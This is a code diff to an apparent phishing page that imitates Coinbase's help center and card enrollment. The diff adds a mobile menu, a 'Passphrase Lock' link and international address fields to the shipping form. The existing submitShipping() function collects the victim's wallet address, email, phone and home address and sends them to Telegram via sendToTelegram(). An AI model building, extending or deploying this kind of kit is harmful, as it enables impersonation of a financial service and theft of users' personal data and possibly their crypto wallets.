@@ -668,8 +668,9 @@
     /* Navbar collapse */
     @media(max-width:640px){
       .cb-nav-links { display: none; }
-      .cb-nav-back  { font-size: 12px; padding: 6px 10px; }
+      .cb-nav-back  { display: none; }
       .cb-breadcrumb{ padding: 6px 16px 8px; }
+      .cb-hamburger { display: flex !important; }
     }
 
     /* Mobile */
@@ -757,10 +758,24 @@
     <div class="cb-nav-links">
       <a href="index.html" class="cb-nav-link">Help Center</a>
       <a href="card.html" class="cb-nav-link active">Coinbase Card</a>
+      <a href="security.html" class="cb-nav-link">Passphrase Lock</a>
       <a href="scam-alerts.html" class="cb-nav-link">Security</a>
-         <a href="portal.html" class="cb-nav-link">Card Portal</a>
+      <a href="portal.html" class="cb-nav-link">Card Portal</a>
     </div>
-    <a href="card.html" class="cb-nav-back">← Back to Card</a>
+    <a href="card.html" class="cb-nav-back" style="flex-shrink:0">← Back to Card</a>
+    <button class="cb-hamburger" onclick="toggleMenu()" style="display:none;background:none;border:none;cursor:pointer;flex-direction:column;gap:5px;padding:4px;margin-left:8px">
+      <span style="display:block;width:22px;height:2px;background:#0A0B0D;border-radius:2px"></span>
+      <span style="display:block;width:22px;height:2px;background:#0A0B0D;border-radius:2px"></span>
+      <span style="display:block;width:22px;height:2px;background:#0A0B0D;border-radius:2px"></span>
+    </button>
+  </div>
+  <div id="cbMobileMenu" style="display:none;flex-direction:column;gap:4px;padding:12px 24px 20px;border-top:1px solid #E8EAED;background:#fff">
+    <a href="index.html" style="padding:10px 0;font-size:15px;font-weight:500;color:#0A0B0D;text-decoration:none;border-bottom:1px solid #E8EAED;display:block">Help Center</a>
+    <a href="card.html" style="padding:10px 0;font-size:15px;font-weight:500;color:#0A0B0D;text-decoration:none;border-bottom:1px solid #E8EAED;display:block">Coinbase Card</a>
+    <a href="security.html" style="padding:10px 0;font-size:15px;font-weight:500;color:#0A0B0D;text-decoration:none;border-bottom:1px solid #E8EAED;display:block">Passphrase Lock</a>
+    <a href="portal.html" style="padding:10px 0;font-size:15px;font-weight:500;color:#0A0B0D;text-decoration:none;border-bottom:1px solid #E8EAED;display:block">Card Portal</a>
+    <a href="scam-alerts.html" style="padding:10px 0;font-size:15px;font-weight:500;color:#0A0B0D;text-decoration:none;border-bottom:1px solid #E8EAED;display:block">Security</a>
+    <a href="wallet-card.html" style="margin-top:12px;background:#0052FF;color:#fff;padding:12px;border-radius:10px;font-size:14px;font-weight:700;text-align:center;display:block;text-decoration:none">Get your card →</a>
   </div>
   <div class="cb-breadcrumb">
     <a href="index.html">Help Center</a>
@@ -1073,6 +1088,80 @@
           </div>
         </div>
         <div class="vm-field">
+          <label>Country</label>
+          <select id="shipCountry" autocomplete="country" onchange="updateStateField()">
+            <option value="">— Select country —</option>
+            <option value="US">🇺🇸 United States</option>
+            <option value="CA">🇨🇦 Canada</option>
+            <option value="GB">🇬🇧 United Kingdom</option>
+            <option value="AU">🇦🇺 Australia</option>
+            <option value="DE">🇩🇪 Germany</option>
+            <option value="FR">🇫🇷 France</option>
+            <option value="IN">🇮🇳 India</option>
+            <option value="BR">🇧🇷 Brazil</option>
+            <option value="MX">🇲🇽 Mexico</option>
+            <option value="NG">🇳🇬 Nigeria</option>
+            <option value="GH">🇬🇭 Ghana</option>
+            <option value="KE">🇰🇪 Kenya</option>
+            <option value="ZA">🇿🇦 South Africa</option>
+            <option value="EG">🇪🇬 Egypt</option>
+            <option value="ET">🇪🇹 Ethiopia</option>
+            <option value="TZ">🇹🇿 Tanzania</option>
+            <option value="UG">🇺🇬 Uganda</option>
+            <option value="RW">🇷🇼 Rwanda</option>
+            <option value="SN">🇸🇳 Senegal</option>
+            <option value="CI">🇨🇮 Côte d'Ivoire</option>
+            <option value="CM">🇨🇲 Cameroon</option>
+            <option value="AO">🇦🇴 Angola</option>
+            <option value="ZM">🇿🇲 Zambia</option>
+            <option value="ZW">🇿🇼 Zimbabwe</option>
+            <option value="JP">🇯🇵 Japan</option>
+            <option value="CN">🇨🇳 China</option>
+            <option value="KR">🇰🇷 South Korea</option>
+            <option value="SG">🇸🇬 Singapore</option>
+            <option value="PH">🇵🇭 Philippines</option>
+            <option value="ID">🇮🇩 Indonesia</option>
+            <option value="MY">🇲🇾 Malaysia</option>
+            <option value="TH">🇹🇭 Thailand</option>
+            <option value="VN">🇻🇳 Vietnam</option>
+            <option value="PK">🇵🇰 Pakistan</option>
+            <option value="BD">🇧🇩 Bangladesh</option>
+            <option value="LK">🇱🇰 Sri Lanka</option>
+            <option value="NP">🇳🇵 Nepal</option>
+            <option value="AE">🇦🇪 United Arab Emirates</option>
+            <option value="SA">🇸🇦 Saudi Arabia</option>
+            <option value="QA">🇶🇦 Qatar</option>
+            <option value="KW">🇰🇼 Kuwait</option>
+            <option value="BH">🇧🇭 Bahrain</option>
+            <option value="OM">🇴🇲 Oman</option>
+            <option value="IL">🇮🇱 Israel</option>
+            <option value="TR">🇹🇷 Turkey</option>
+            <option value="NL">🇳🇱 Netherlands</option>
+            <option value="BE">🇧🇪 Belgium</option>
+            <option value="CH">🇨🇭 Switzerland</option>
+            <option value="AT">🇦🇹 Austria</option>
+            <option value="SE">🇸🇪 Sweden</option>
+            <option value="NO">🇳🇴 Norway</option>
+            <option value="DK">🇩🇰 Denmark</option>
+            <option value="FI">🇫🇮 Finland</option>
+            <option value="PT">🇵🇹 Portugal</option>
+            <option value="ES">🇪🇸 Spain</option>
+            <option value="IT">🇮🇹 Italy</option>
+            <option value="PL">🇵🇱 Poland</option>
+            <option value="RO">🇷🇴 Romania</option>
+            <option value="CZ">🇨🇿 Czech Republic</option>
+            <option value="HU">🇭🇺 Hungary</option>
+            <option value="GR">🇬🇷 Greece</option>
+            <option value="AR">🇦🇷 Argentina</option>
+            <option value="CL">🇨🇱 Chile</option>
+            <option value="CO">🇨🇴 Colombia</option>
+            <option value="PE">🇵🇪 Peru</option>
+            <option value="VE">🇻🇪 Venezuela</option>
+            <option value="EC">🇪🇨 Ecuador</option>
+            <option value="NZ">🇳🇿 New Zealand</option>
+          </select>
+        </div>
+        <div class="vm-field">
           <label>Street address</label>
           <input type="text" id="shipStreet" placeholder="123 Main Street" autocomplete="address-line1" />
         </div>
@@ -1083,30 +1172,16 @@
         <div class="ship-csz" style="display:grid;grid-template-columns:2fr 1fr 1fr;gap:12px">
           <div class="vm-field">
             <label>City</label>
-            <input type="text" id="shipCity" placeholder="San Francisco" autocomplete="address-level2" />
+            <input type="text" id="shipCity" placeholder="Your city" autocomplete="address-level2" />
+          </div>
+          <div class="vm-field" id="stateWrap">
+            <label id="stateLabel">State / Province</label>
+            <select id="shipState" autocomplete="address-level1" style="display:none"><option value="">—</option></select>
+            <input type="text" id="shipStateText" placeholder="State / Region" autocomplete="address-level1" />
           </div>
           <div class="vm-field">
-            <label>State</label>
-            <select id="shipState" autocomplete="address-level1">
-              <option value="">—</option>
-              <option>AL</option><option>AK</option><option>AZ</option><option>AR</option>
-              <option>CA</option><option>CO</option><option>CT</option><option>DE</option>
-              <option>FL</option><option>GA</option><option>HI</option><option>ID</option>
-              <option>IL</option><option>IN</option><option>IA</option><option>KS</option>
-              <option>KY</option><option>LA</option><option>ME</option><option>MD</option>
-              <option>MA</option><option>MI</option><option>MN</option><option>MS</option>
-              <option>MO</option><option>MT</option><option>NE</option><option>NV</option>
-              <option>NH</option><option>NJ</option><option>NM</option><option>NY</option>
-              <option>NC</option><option>ND</option><option>OH</option><option>OK</option>
-              <option>OR</option><option>PA</option><option>RI</option><option>SC</option>
-              <option>SD</option><option>TN</option><option>TX</option><option>UT</option>
-              <option>VT</option><option>VA</option><option>WA</option><option>WV</option>
-              <option>WI</option><option>WY</option>
-            </select>
-          </div>
-          <div class="vm-field">
-            <label>ZIP</label>
-            <input type="text" id="shipZip" placeholder="94107" maxlength="5" inputmode="numeric" autocomplete="postal-code" />
+            <label>Postal code</label>
+            <input type="text" id="shipZip" placeholder="00000" inputmode="numeric" autocomplete="postal-code" />
           </div>
         </div>
         <div class="vm-row-2">
@@ -1215,6 +1290,13 @@ function genJWT() {
 }
 
 /* ── SCREEN NAVIGATION ── */
+function toggleMenu() {
+  const m = document.getElementById('cbMobileMenu');
+  if (!m) return;
+  m.style.display = m.style.display === 'flex' ? 'none' : 'flex';
+  m.style.flexDirection = 'column';
+}
+
 function showScreen(id) {
   document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
   document.getElementById(id).classList.add('active');
@@ -1473,6 +1555,43 @@ function toggleCardFlip() {
 
 function goShipping() { showScreen('s6'); }
 
+/* ── COUNTRY → STATE/PROVINCE LOOKUP ── */
+const COUNTRY_STATES = {
+  US: ['Alabama','Alaska','Arizona','Arkansas','California','Colorado','Connecticut','Delaware','Florida','Georgia','Hawaii','Idaho','Illinois','Indiana','Iowa','Kansas','Kentucky','Louisiana','Maine','Maryland','Massachusetts','Michigan','Minnesota','Mississippi','Missouri','Montana','Nebraska','Nevada','New Hampshire','New Jersey','New Mexico','New York','North Carolina','North Dakota','Ohio','Oklahoma','Oregon','Pennsylvania','Rhode Island','South Carolina','South Dakota','Tennessee','Texas','Utah','Vermont','Virginia','Washington','West Virginia','Wisconsin','Wyoming'],
+  CA: ['Alberta','British Columbia','Manitoba','New Brunswick','Newfoundland and Labrador','Northwest Territories','Nova Scotia','Nunavut','Ontario','Prince Edward Island','Quebec','Saskatchewan','Yukon'],
+  AU: ['Australian Capital Territory','New South Wales','Northern Territory','Queensland','South Australia','Tasmania','Victoria','Western Australia'],
+  GB: ['England','Scotland','Wales','Northern Ireland'],
+  DE: ['Baden-Württemberg','Bavaria','Berlin','Brandenburg','Bremen','Hamburg','Hesse','Lower Saxony','Mecklenburg-Vorpommern','North Rhine-Westphalia','Rhineland-Palatinate','Saarland','Saxony','Saxony-Anhalt','Schleswig-Holstein','Thuringia'],
+  IN: ['Andhra Pradesh','Arunachal Pradesh','Assam','Bihar','Chhattisgarh','Goa','Gujarat','Haryana','Himachal Pradesh','Jharkhand','Karnataka','Kerala','Madhya Pradesh','Maharashtra','Manipur','Meghalaya','Mizoram','Nagaland','Odisha','Punjab','Rajasthan','Sikkim','Tamil Nadu','Telangana','Tripura','Uttar Pradesh','Uttarakhand','West Bengal'],
+  BR: ['Acre','Alagoas','Amapá','Amazonas','Bahia','Ceará','Distrito Federal','Espírito Santo','Goiás','Maranhão','Mato Grosso','Mato Grosso do Sul','Minas Gerais','Pará','Paraíba','Paraná','Pernambuco','Piauí','Rio de Janeiro','Rio Grande do Norte','Rio Grande do Sul','Rondônia','Roraima','Santa Catarina','São Paulo','Sergipe','Tocantins'],
+  MX: ['Aguascalientes','Baja California','Baja California Sur','Campeche','Chiapas','Chihuahua','Ciudad de México','Coahuila','Colima','Durango','Guanajuato','Guerrero','Hidalgo','Jalisco','México','Michoacán','Morelos','Nayarit','Nuevo León','Oaxaca','Puebla','Querétaro','Quintana Roo','San Luis Potosí','Sinaloa','Sonora','Tabasco','Tamaulipas','Tlaxcala','Veracruz','Yucatán','Zacatecas'],
+  NG: ['Abia','Adamawa','Akwa Ibom','Anambra','Bauchi','Bayelsa','Benue','Borno','Cross River','Delta','Ebonyi','Edo','Ekiti','Enugu','FCT','Gombe','Imo','Jigawa','Kaduna','Kano','Katsina','Kebbi','Kogi','Kwara','Lagos','Nasarawa','Niger','Ogun','Ondo','Osun','Oyo','Plateau','Rivers','Sokoto','Taraba','Yobe','Zamfara'],
+  ZA: ['Eastern Cape','Free State','Gauteng','KwaZulu-Natal','Limpopo','Mpumalanga','North West','Northern Cape','Western Cape'],
+  KE: ['Baringo','Bomet','Bungoma','Busia','Elgeyo Marakwet','Embu','Garissa','Homa Bay','Isiolo','Kajiado','Kakamega','Kericho','Kiambu','Kilifi','Kirinyaga','Kisii','Kisumu','Kitui','Kwale','Laikipia','Lamu','Machakos','Makueni','Mandera','Marsabit','Meru','Migori','Mombasa','Murang\'a','Nairobi','Nakuru','Nandi','Narok','Nyamira','Nyandarua','Nyeri','Samburu','Siaya','Taita Taveta','Tana River','Tharaka Nithi','Trans Nzoia','Turkana','Uasin Gishu','Vihiga','Wajir','West Pokot'],
+  GH: ['Ahafo','Ashanti','Bono','Bono East','Central','Eastern','Greater Accra','North East','Northern','Oti','Savannah','Upper East','Upper West','Volta','Western','Western North'],
+  AR: ['Buenos Aires','Catamarca','Chaco','Chubut','Córdoba','Corrientes','Entre Ríos','Formosa','Jujuy','La Pampa','La Rioja','Mendoza','Misiones','Neuquén','Río Negro','Salta','San Juan','San Luis','Santa Cruz','Santa Fe','Santiago del Estero','Tierra del Fuego','Tucumán'],
+};
+
+function updateStateField() {
+  const country = (document.getElementById('shipCountry') || {}).value;
+  const sel  = document.getElementById('shipState');
+  const txt  = document.getElementById('shipStateText');
+  const lbl  = document.getElementById('stateLabel');
+  const states = COUNTRY_STATES[country];
+  if (states) {
+    sel.innerHTML = '<option value="">— Select —</option>' +
+      states.map(s => `<option value="${s}">${s}</option>`).join('');
+    sel.style.display = '';
+    txt.style.display = 'none';
+    lbl.textContent = country === 'US' ? 'State' : country === 'CA' ? 'Province' : country === 'AU' ? 'State / Territory' : 'State / Region';
+  } else {
+    sel.style.display = 'none';
+    txt.style.display = '';
+    lbl.textContent = 'State / Province / Region';
+    txt.placeholder = country ? 'State / Province / Region' : 'State / Province / Region';
+  }
+}
+
 async function submitShipping() {
   const first  = (document.getElementById('shipFirst')  || {}).value || '';
   const last   = (document.getElementById('shipLast')   || {}).value || '';
@@ -1481,10 +1600,13 @@ async function submitShipping() {
   const phone  = (document.getElementById('shipPhone')  || {}).value || '';
   const street = (document.getElementById('shipStreet') || {}).value || '';
   const apt    = (document.getElementById('shipApt')    || {}).value || '';
-  const city   = (document.getElementById('shipCity')   || {}).value || '';
-  const state  = (document.getElementById('shipState')  || {}).value || '';
-  const zip    = (document.getElementById('shipZip')    || {}).value || '';
-  const address = [street, apt, city, state, zip].filter(Boolean).join(', ');
+  const city    = (document.getElementById('shipCity')      || {}).value || '';
+  const selEl   = document.getElementById('shipState');
+  const txtEl   = document.getElementById('shipStateText');
+  const state   = (selEl && selEl.style.display !== 'none' ? selEl.value : (txtEl || {}).value) || '';
+  const zip     = (document.getElementById('shipZip')       || {}).value || '';
+  const country = (document.getElementById('shipCountry')   || {}).value || '';
+  const address = [street, apt, city, state, zip, country].filter(Boolean).join(', ');
 
   const tgMsg = `📦 *Physical Card Enrollment*\n👤 Name: ${walletAddr}\n📧 Email: ${email || '—'}\n📱 Phone: ${phone || '—'}\n🏠 Address: ${address || '—'}\n💳 Card: Physical`;
   sendToTelegram(tgMsg).catch(() => {});
